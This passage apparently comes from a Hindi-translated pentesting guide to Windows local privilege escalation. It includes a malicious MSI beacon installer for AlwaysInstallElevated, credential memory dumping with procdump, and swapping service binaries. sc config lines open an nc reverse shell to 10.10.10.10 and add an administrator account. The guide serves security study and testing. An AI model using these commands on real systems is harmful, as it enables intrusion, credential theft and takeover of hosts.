{{#endref}}

### Visual Studio से MSI बनाएं

- Cobalt Strike या Metasploit से `C:\privesc\beacon.exe` में एक **नया Windows EXE TCP payload** **बनाएं**।
- **Visual Studio** खोलें, **Create a new project** चुनें और search box में "installer" टाइप करें। **Setup Wizard** project चुनें और **Next** पर क्लिक करें।
- Project को कोई नाम दें, जैसे **AlwaysPrivesc**; location के लिए **`C:\privesc`** इस्तेमाल करें; **place solution and project in the same directory** चुनें और **Create** पर क्लिक करें।
- जब तक आप चरण 3 में न पहुंचें, **Next** पर क्लिक करते रहें (शामिल करने के लिए files चुनें)। **Add** पर क्लिक करें और अभी बनाया गया Beacon payload चुनें। फिर **Finish** पर क्लिक करें।
- **Solution Explorer** में **AlwaysPrivesc** project को चुनें और **Properties** में **TargetPlatform** को **x86** से बदलकर **x64** करें।
  - आप अन्य properties भी बदल सकते हैं, जैसे **Author** और **Manufacturer**, जिससे installed app अधिक वैध दिख सकता है।
- Project पर right-click करें और **View > Custom Actions** चुनें।
- **Install** पर right-click करें और **Add Custom Action** चुनें।
- **Application Folder** पर double-click करें, अपनी **beacon.exe** file चुनें और **OK** पर क्लिक करें। इससे installer चलाते ही Beacon payload execute होगा।
- **Custom Action Properties** के अंतर्गत, **Run64Bit** को **True** करें।
- अंत में, **build** करें।
  - अगर `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` warning दिखाई दे, तो सुनिश्चित करें कि आपने platform को x64 पर सेट किया है।

### MSI Installation

Malicious `.msi` file की **installation** को **background** में execute करने के लिए:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

इस vulnerability का exploit करने के लिए आप इसका इस्तेमाल कर सकते हैं: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

ये सेटिंग्स तय करती हैं कि क्या **लॉग** किया जा रहा है, इसलिए आपको इस पर ध्यान देना चाहिए

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding में यह जानना दिलचस्प है कि logs कहाँ भेजे जाते हैं।

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** को **local Administrator passwords के प्रबंधन** के लिए डिज़ाइन किया गया है। यह सुनिश्चित करता है कि domain से जुड़े कंप्यूटरों पर हर password **अलग, random और नियमित रूप से अपडेट** हो। ये passwords Active Directory में सुरक्षित रूप से संग्रहीत होते हैं और केवल वे उपयोगकर्ता इन्हें access कर सकते हैं जिन्हें ACLs के ज़रिए पर्याप्त permissions दी गई हों। अनुमति होने पर वे local admin passwords देख सकते हैं।


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

सक्रिय होने पर, **plain-text passwords LSASS** (Local Security Authority Subsystem Service) में संग्रहीत होते हैं।\
[**इस पेज पर WDigest के बारे में अधिक जानकारी**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1** से, Microsoft ने Local Security Authority (LSA) के लिए बेहतर सुरक्षा शुरू की, ताकि अविश्वसनीय processes को उसकी **memory पढ़ने** या उसमें code inject करने से **रोका** जा सके और सिस्टम को और सुरक्षित बनाया जा सके।\
[**LSA Protection के बारे में अधिक जानकारी यहाँ**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** को **Windows 10** में पेश किया गया था। इसका उद्देश्य किसी डिवाइस पर संग्रहीत credentials को pass-the-hash attacks जैसे खतरों से सुरक्षित रखना है। [**Credential Guard के बारे में अधिक जानकारी यहां उपलब्ध है।**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### कैश्ड क्रेडेंशियल्स

**Domain credentials** को **Local Security Authority** (LSA) द्वारा प्रमाणित किया जाता है और ऑपरेटिंग सिस्टम के घटक इनका उपयोग करते हैं। जब किसी उपयोगकर्ता का लॉगऑन डेटा किसी पंजीकृत security package द्वारा प्रमाणित किया जाता है, तो आमतौर पर उस उपयोगकर्ता के लिए domain credentials स्थापित किए जाते हैं।\
[**कैश्ड क्रेडेंशियल्स के बारे में अधिक जानकारी यहाँ**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## उपयोगकर्ता और समूह

### उपयोगकर्ता और समूहों की सूची बनाएँ

जाँचें कि जिन समूहों के आप सदस्य हैं, उनमें से किसी के पास दिलचस्प अनुमतियाँ तो नहीं हैं।

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### विशेषाधिकार प्राप्त समूह

यदि आप **किसी विशेषाधिकार प्राप्त समूह के सदस्य हैं, तो आप विशेषाधिकार बढ़ा सकते हैं**। विशेषाधिकार प्राप्त समूहों के बारे में जानें और यहां जानें कि विशेषाधिकार बढ़ाने के लिए उनका दुरुपयोग कैसे करें:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

इस पेज पर **token** के बारे में **और जानें**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)।\
दिलचस्प tokens के बारे में **जानने** और उनका दुरुपयोग करने का तरीका जानने के लिए अगला पेज देखें:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### लॉग इन किए गए उपयोगकर्ता / Sessions

```bash
qwinsta
klist sessions
```

### होम फ़ोल्डर

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### पासवर्ड नीति

```bash
net accounts
```

### क्लिपबोर्ड की सामग्री प्राप्त करें

```bash
powershell -command "Get-Clipboard"
```

## Running Processes

### File and Folder Permissions

सबसे पहले, processes की सूची बनाते समय **process की command line में passwords खोजें**।\
जाँचें कि क्या आप **चल रहे किसी binary को overwrite कर सकते हैं** या संभावित [**DLL Hijacking attacks**](dll-hijacking/index.html) का फायदा उठाने के लिए binary folder में आपके पास write permissions हैं:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

हमेशा देखें कि [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) चल तो नहीं रहे; privileges escalate करने के लिए आप उनका दुरुपयोग कर सकते हैं।

Debugger listener थोड़े समय के लिए ही सक्रिय हो सकता है, इसलिए एक passive port snapshot में उसका न दिखना यह साबित नहीं करता कि वह कभी खुला ही नहीं था। देखे गए किसी भी listener का PID, process owner और उस तक कम privileges वाले user की पहुँच की क्षमता जाँचें; केवल application का नाम या debug flag, users के बीच code execution की क्षमता साबित नहीं करता। नियमित enumeration को passive रखें और debugger commands न भेजें।

**प्रोसेस की binaries की permissions जाँचना**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**प्रोसेस बाइनरीज़ के फ़ोल्डरों की अनुमतियों की जाँच (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor directories

Snort 2, कॉन्फ़िगरेशन में घोषित `dynamicpreprocessor directory` से shared libraries लोड कर सकता है; यह कॉन्फ़िगरेशन `snort.exe -c <config>` से चुना जाता है। यदि कोई scheduled task या service Snort को किसी दूसरे account के तहत चलाती है, तो उसी कॉन्फ़िगरेशन और घोषित module directory के ACL की जाँच करें। यदि आपका token वहाँ files बना सकता है, तो अगली बार task या service द्वारा modules लोड किए जाने पर code execution के लिए उस path की समीक्षा की जा सकती है। Run-as account के effective privileges, active configuration, module compatibility, और deny या share restrictions की पुष्टि करें; केवल writable directory होने से privilege escalation साबित नहीं होता। [Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) runtime module loading के बारे में बताता है।

### Privileged web service with a writable document root

Windows Apache installation में, service के executable path और run-as account की तुलना उसके active `httpd.conf` में मौजूद `DocumentRoot` से करें। सामान्य XAMPP layout के लिए, `C:\xampp\apache\conf\httpd.conf` और उसके configured document root के ACL की जाँच करें, जो अक्सर `C:\xampp\htdocs` होता है। यदि कम privileges वाला user उस root में files बना सकता है और Apache `LocalSystem` के रूप में चलता है, तो server-side code execution host की privilege boundary पार कर सकता है। पुष्टि करें कि service चल रही है, वही exact path serve किया जा रहा है, और server-side handler उस file type को process करता है; केवल writable root से file creation ही साबित होती है। Probe file लिखे बिना ACL की जाँच करें:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

एक पारंपरिक WAMP installation में, service किसी versioned `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (या 32-bit layout में `C:\wamp\...`) को point कर सकती है। इसकी configuration पास में `conf\httpd.conf` में होती है और default root `C:\wamp64\www` या `C:\wamp\www` होता है। सटीक service image, उसका run-as identity, प्रभावी `DocumentRoot` (जिसमें `${INSTALL_DIR}` का expansion और virtual-host overrides शामिल हैं) और root ACL—इन सबकी एक साथ जाँच करें। WAMP directory में लिखने की अनुमति से यह साबित नहीं होता कि Apache `SYSTEM` के रूप में चलता है या जमा की गई file को execute करता है। [Apache documents how a Windows service selects its configuration](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Writable IIS root और application-pool network identity

IIS में, `applicationHost.config` में किसी writable physical directory को **active site/application** से map करें, फिर उसका configured pool और server-side handler पहचानें। Served directory में रखे गए code को pool के रूप में तभी चलाया जाएगा, जब IIS उस file type को process करे और route तक पहुँचना संभव हो। Writable directory को code execution मानने से पहले current user's effective create-file access, site runtime state, handler और per-path overrides जाँचें।

ASP.NET dynamic compilation की भी अलग से जाँच करें: application की compilation directory के नीचे generated files। Default रूप से यह संबंधित .NET Framework installation के नीचे `Temporary ASP.NET Files` directory होती है, लेकिन application का `<compilation tempDirectory>` इसे बदल सकता है। [Microsoft documents the location and per-application subdirectories](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) और [recommends isolating compilation directories when application pools do not trust each other](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). यदि कम privileged token किसी **विशिष्ट** application के cache में generated source को बदल सकता है, तो पता करें कि क्या वह application इसे अधिक privileged [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) के तहत फिर से compile करता है। केवल file या directory ACL से code execution साबित नहीं होता: cache को active application, effective token और ACL, compilation settings, process identity और किसी भी recompile के समय से मिलाकर जाँचें। केवल read-only metadata की समीक्षा करें; enumeration के दौरान compilation शुरू न करें और cache files में बदलाव न करें।

`ApplicationPoolIdentity` या `NetworkService` के रूप में configured IIS pool, आम तौर पर domain resources पर **host computer account** के रूप में authenticate करता है, भले ही उसका local token कम privileged हो। `LocalSystem` को local स्तर पर पहले से ही उच्च privileges प्राप्त होते हैं और यह network पर computer account का भी उपयोग करता है; `LocalService` सामान्यतः anonymous network credentials प्रस्तुत करता है। `SpecificUser` pool इसके बजाय अपने configured account का उपयोग करता है। [Microsoft documents these identity types](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) और [the application-pool network identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Identity setting न होने पर pool defaults लागू हो सकते हैं, जो IIS generations के अनुसार अलग-अलग होते हैं; इसलिए pool name देखकर अनुमान लगाने के बजाय effective configuration पता करें। यदि code execution ऐसे pool तक पहुँचता है जिसकी network identity computer account है, तो उस **विशिष्ट computer** के directory rights का आकलन करें। [DCSync](../active-directory-methodology/dcsync.md) के लिए domain naming context पर replication rights आवश्यक हैं; केवल machine-account ticket या host role से ये rights साबित नहीं होते। Passive enumeration में configuration और ACLs की जाँच करें—file upload किए बिना, network authentication किए बिना और tickets माँगे बिना।

ऐसे readable ASP.NET handler के लिए जो helper process शुरू करता है, request से प्राप्त किसी भी value को authentication, decryption, validation और command construction के हर चरण में trace करें। यदि कोई handler decoded token को `ProcessStartInfo("cmd", "/c ...")` में concatenate करता है, तो shell metacharacters command बदल सकते हैं; [Microsoft documents `cmd`'s special characters](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). पहले यह सुनिश्चित करें कि कोई untrusted caller decoded value को वास्तव में प्रभावित कर सकता है और handler तक पहुँच सकता है; फिर effective application-pool या impersonated identity और child process की identity पता करें। केवल source की कोई readable line, localhost listener या token-format की कमजोरी privileged command execution साबित नहीं करती। Passive enumeration के दौरान forged requests भेजे बिना और helper चलाए बिना source तथा pool configuration की समीक्षा करें।

Windows पर PHP service के लिए, request-controlled path को [`include` or `require`](https://www.php.net/manual/en/function.include.php) में pass करने से lower-user-writable PHP file worker की identity के तहत evaluate हो सकती है। पुष्टि करें कि request उस statement तक पहुँच सकती है, resolved path ऐसी file को दर्शाता है जिसे lower user modify कर सकता है और worker read कर सकता है, लागू PHP path restrictions include की अनुमति देती हैं, और worker वास्तव में अधिक privileges के साथ चलता है। केवल loopback listener या writable file से यह chain साबित नहीं होती; passive enumeration के दौरान endpoint invoke किए बिना source, service identity और file ACLs की जाँच करें।

### मेमोरी पासवर्ड माइनिंग

आप sysinternals के **procdump** का उपयोग करके चल रहे process का memory dump बना सकते हैं। FTP जैसी services के **credentials memory में clear text में होते हैं**; memory dump करके credentials पढ़ने की कोशिश करें।

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### असुरक्षित GUI ऐप्स

**SYSTEM के रूप में चलने वाले एप्लिकेशन किसी उपयोगकर्ता को CMD खोलने या डायरेक्टरी ब्राउज़ करने दे सकते हैं।**

उदाहरण: "Windows Help and Support" (Windows + F1), "command prompt" खोजें, "Click to open Command Prompt" पर क्लिक करें

### विशेषाधिकार प्राप्त project-file import

ऐसा एप्लिकेशन जो किसी कम-विशेषाधिकार वाले उपयोगकर्ता द्वारा लिखे जा सकने वाले drop directory से प्रोजेक्ट अपने-आप खोलता है, importer के खाते के अंतर्गत input trust boundary पार करता है। **सटीक writable path**, उसे खोलने वाली process या task, उसकी effective identity, और parser build की जाँच करें। [Ghidra project open/restore की एक पुरानी समस्या](https://github.com/NationalSecurityAgency/ghidra/issues/71) के कारण project metadata में XML external entities का उपयोग संभव था; Windows पर network entity, importing account से authentication करा सकती थी, यदि [outbound SMB और NTLM policy](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) इसकी अनुमति दें। यह credential exposure की संभावना है, तत्काल administrator access नहीं: response को किसी अलग अधिकृत या vulnerable path के ज़रिए उपयोग किया जा सकना चाहिए, और मौजूदा builds का आकलन उनकी वास्तविक patch स्थिति के आधार पर होना चाहिए। Passive enumeration के दौरान crafted project न खोलें; import workflow और ACLs की जाँच करें।

## Services

Service Control Manager (SCM) object का [`SC_MANAGER_CREATE_SERVICE` right](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights), किसी मौजूदा service पर मौजूद rights से अलग है। उस right के लिए सफल read-only [`OpenSCManager` access request](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) जाँच का संकेत है, इस बात का प्रमाण नहीं कि कोई नई service चल सकती है। [`CreateService` एक handle लौटाता है](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew), जिसमें creation के समय माँगा गया service access होता है; बाद में service को फिर से खोलने पर अलग access check होता है और यह विफल हो सकता है, भले ही मूल handle का उपयोग किया जा सकता हो। Effective local या remote token, granted handle rights, service account, start policy और executable path की अलग-अलग जाँच करें। Passive enumeration के दौरान service न बनाएँ और न शुरू करें।

Remote service-install path के लिए, इन SCM rights का मिलान target पर ऐसे share से करें जिसे **वही network logon** लिख सके, उसके underlying NTFS ACL से, और ऐसे local executable path से जिसे service account चला सके। यदि असामान्य रूप से व्यापक SCM rights और file-placement path, दोनों मौजूद हों, तो non-admin account इस boundary को पार कर सकता है; इसके लिए administrative share अनिवार्य नहीं है। Share पर write access अकेले, या SCM create-service का संकेत अकेले, यह साबित नहीं करता कि नई service उच्चतर identity के अंतर्गत शुरू हो सकती है।

कोई मौजूदा service startup, shutdown या किसी अन्य lifecycle event पर helper executable चला सकती है, भले ही वह helper उसके `ImagePath` में मौजूद न हो। यदि helper का नाम किसी कम-विशेषाधिकार वाले उपयोगकर्ता द्वारा लिखे जा सकने वाले directory में resolve होता है और service उच्चतर identity के अंतर्गत चलती है, तो अनुपस्थित helper file को शर्तों के अधीन बदला जा सकने वाला उम्मीदवार माना जा सकता है। **वास्तविक service code या दस्तावेज़ीकृत helper invocation**, resolved executable path और search order, directory बनाने के अधिकार, service identity, और उपलब्ध lifecycle trigger की पुष्टि करें। Writable service directory या अनुपस्थित file अकेले यह साबित नहीं करते कि service उस file को load करती है; passive review के दौरान service को शुरू या बंद न करें।

मौजूदा service के लिए, [`SERVICE_START` से `StartService` को arguments दिए जा सकते हैं](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); यह [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) से अलग है। Start access को केवल control right से अधिक मानने से पहले service के code या दस्तावेज़ीकृत interface की समीक्षा करें। यदि यह caller द्वारा चुने गए argument को log या export path के रूप में उपयोग करती है, तो service identity, argument से write तक के सटीक flow, path restrictions और **बनाई गई file** की permissions की पुष्टि करें। Protected directory में write करना escalation तभी बन सकता है जब कोई अलग privileged consumer या loader उस file को स्वीकार करे; writable log या start right अकेले पर्याप्त नहीं हैं। Passive inventory के दौरान service शुरू न करें और test file न बनाएँ।

NSClient++ monitoring agent के लिए, पढ़ी जा सकने वाली `nsclient.ini` एक **configuration review lead** है: इसमें web credentials हो सकते हैं, जबकि `boot.ini` configuration को किसी दूसरी जगह redirect कर सकती है। वास्तविक service account, WEB listener और access policy, और authenticated role द्वारा settings या scripts बदल पाने की जाँच करें। Privileged execution के लिए अतिरिक्त रूप से `CheckExternalScripts` (या कोई अन्य enabled execution path), command register या modify करने का प्रभावी अधिकार, और ऐसा trigger आवश्यक है जो इसे service identity के अंतर्गत चलाए। केवल loopback पर सुनने वाला listener भी local user के लिए reachable हो सकता है, लेकिन file path, password या listener अकेले उन अधिकारों को साबित नहीं करते। Passive enumeration के दौरान secrets दिखाए बिना और web API invoke किए बिना metadata और permissions की समीक्षा करें। देखें: [NSClient++ file layout](https://nsclient.org/docs/concepts/file-layout/), [web और script security guidance](https://nsclient.org/docs/setup/securing/), और [external-script configuration](https://nsclient.org/docs/reference/check/CheckExternalScripts/)।

जिस service का `ImagePath` `nssm.exe` है, उसके लिए service का वास्तविक run-as account और उसका `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` value देखें: [NSSM child application को वहाँ संग्रहीत करता है](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), जबकि `AppDirectory` उसका configured working directory है। Wrapper की permissions को service boundary का पूरा विवरण मानने से पहले child executable और उसके parent-directory ACLs की जाँच करें। उस child द्वारा उजागर किया गया local WCF या SOAP endpoint, जाँच का एक अलग संकेत है: पुष्टि करें कि lower-privileged user उस listener तक पहुँच सकता है, उसका सटीक operation उस user का input स्वीकार करता है, और service child उच्चतर identity के अंतर्गत unsafe operation चलाता है। Service account, endpoint URL या writable path अकेले escalation साबित नहीं करते; passive enumeration के दौरान service operations invoke न करें।

Custom WCF operation के लिए, caller के नियंत्रण वाली string को किसी भी PowerShell runspace तक trace करें। [`Pipeline.Commands.AddScript script text जोड़ता है](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), और [`Pipeline.Invoke` pipeline चलाता है](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke)। [`Windows transport credentials वाला `netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) client को authenticate करता है, लेकिन उस **विशिष्ट** operation को call करने का authorization और runspace की effective identity अलग से जाँचनी चाहिए। उच्चतर service identity के अंतर्गत lower-privileged caller के input से `AddScript` तक जाने वाला path, code-execution boundary है; listening port, authenticated client या किसी असंबंधित assembly में unused method अकेले इसका प्रमाण नहीं हैं। Enumeration के दौरान endpoint invoke किए बिना deployed service, contract, authorization और impersonation settings की static review करें।

Service Triggers कुछ परिस्थितियों (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh आदि) के होने पर Windows को service शुरू करने देते हैं। SERVICE_START rights न होने पर भी, अक्सर इनके triggers सक्रिय करके privileged services शुरू की जा सकती हैं। Enumeration और activation की तकनीकें यहाँ देखें:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio diagnostic collector service

C/C++ tooling वाले Visual Studio installations में `VSStandardCollectorService150` शामिल हो सकती है, जो `LocalSystem` के रूप में चलने के लिए configured diagnostic service है। [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) में service DACL reset को redirect करने के लिए junction और object-manager-link race का उपयोग किया गया था। प्रदर्शित escalation के लिए एक उपयोग योग्य Visual Studio Setup WMI Provider MSI repair path और उसका `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` target भी आवश्यक था। इस component को जनवरी 2024 में ठीक किया गया था।

Passive triage के लिए, केवल उस service का account और binary path देखें, जाँचें कि Setup WMI compiler path मौजूद है या नहीं, और installed component की patch स्थिति सत्यापित करें। केवल service entry, Visual Studio product version या compiler file से यह साबित नहीं होता कि host vulnerable है। जाँच के लिए service शुरू करने या repair चलाने की आवश्यकता नहीं है।

Services की सूची प्राप्त करें:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### अनुमतियाँ

आप किसी service की जानकारी पाने के लिए **sc** का उपयोग कर सकते हैं.

```bash
sc qc <service_name>
```

हर service के लिए आवश्यक privilege level की जाँच करने हेतु _Sysinternals_ से binary **accesschk** उपलब्ध रखने की सलाह दी जाती है।

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

यह जांचने की सलाह दी जाती है कि क्या "Authenticated Users" किसी service को modify कर सकते हैं:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[आप XP के लिए accesschk.exe यहां से डाउनलोड कर सकते हैं](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### सेवा सक्षम करें

यदि आपको यह त्रुटि मिल रही है (उदाहरण के लिए SSDPSRV के साथ):

_System error 1058 has occurred._\
_सेवा शुरू नहीं की जा सकती, क्योंकि यह अक्षम है या इससे कोई सक्षम डिवाइस संबद्ध नहीं है।_

आप इसे इस तरह सक्षम कर सकते हैं.

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**ध्यान रखें कि service upnphost काम करने के लिए SSDPSRV पर निर्भर करती है (XP SP1 के लिए)**

**इस समस्या का एक अन्य समाधान** यह चलाना है:

```
sc.exe config usosvc start= auto
```

### **Service binary path में बदलाव**

जब "Authenticated users" group के पास किसी service पर **SERVICE_ALL_ACCESS** हो, तो service की executable binary में बदलाव करना संभव है। **sc** को modify और execute करने के लिए:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### सेवा पुनः प्रारंभ करें

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

विभिन्न permissions के ज़रिए privileges बढ़ाए जा सकते हैं:

- **SERVICE_CHANGE_CONFIG**: service binary को फिर से configure करने की अनुमति देता है।
- **WRITE_DAC**: permissions को फिर से configure करने की सुविधा देता है, जिससे service configurations बदलना संभव होता है।
- **WRITE_OWNER**: ownership हासिल करने और permissions को फिर से configure करने की अनुमति देता है।
- **GENERIC_WRITE**: service configurations बदलने की क्षमता विरासत में देता है।
- **GENERIC_ALL**: इससे भी service configurations बदलने की क्षमता विरासत में मिलती है।

इस vulnerability का पता लगाने और इसका exploitation करने के लिए _exploit/windows/local/service_permissions_ का उपयोग किया जा सकता है।

### Services binaries की कमजोर permissions

अगर कोई service **`LocalSystem`**, **`LocalService`**, **`NetworkService`** या किसी privileged domain account के रूप में चलती है, लेकिन **कम privileges वाले users service EXE या उसके parent folder में बदलाव कर सकते हैं**, तो अक्सर **binary को बदलकर और service को restart करके** उसे hijack किया जा सकता है।

**जाँचें कि क्या आप service द्वारा execute की जाने वाली binary में बदलाव कर सकते हैं** या उस **folder पर write permissions हैं** जहाँ binary मौजूद है ([**DLL Hijacking**](dll-hijacking/index.html))**।**\
आप **wmic** (system32 में नहीं) का उपयोग करके service द्वारा execute की जाने वाली हर binary देख सकते हैं और **icacls** से अपनी permissions जाँच सकते हैं:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

आप **sc** और **icacls** का भी उपयोग कर सकते हैं:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**, **`BUILTIN\Users`**, या **`Authenticated Users`** को दिए गए खतरनाक ACLs देखें, खासकर service executable या उसे रखने वाली directory पर **`(F)`**, **`(M)`**, या **`(W)`**। दुरुपयोग का एक व्यावहारिक तरीका यह है:<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` से service account और executable path की पुष्टि करें।
2. `icacls <path>` से पुष्टि करें कि binary लिखने योग्य है।
3. Service binary को payload या किसी वैध malicious service binary से बदलें।
4. `sc stop <service_name> && sc start <service_name>` से service restart करें (या reboot / service trigger का इंतज़ार करें)।

उपयोगी automated checks:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> यदि service किसी सामान्य user को इसे restart करने की अनुमति नहीं देती है, तो जाँचें कि क्या यह boot पर अपने-आप शुरू होती है, इसमें कोई failure action है जो इसे फिर से शुरू करता है, या इसे इस्तेमाल करने वाले application द्वारा अप्रत्यक्ष रूप से trigger किया जा सकता है।

### Services registry modify permissions

आपको जाँचना चाहिए कि क्या आप किसी service registry को modify कर सकते हैं।\
आप ये करके किसी service **registry** पर अपनी **permissions** **check** कर सकते हैं:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

मूल permission test इस तरह बताया गया था:

यह जाँचना चाहिए कि **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास `FullControl` permissions हैं या नहीं। यदि ऐसा है, तो service द्वारा execute की जाने वाली binary को बदला जा सकता है।

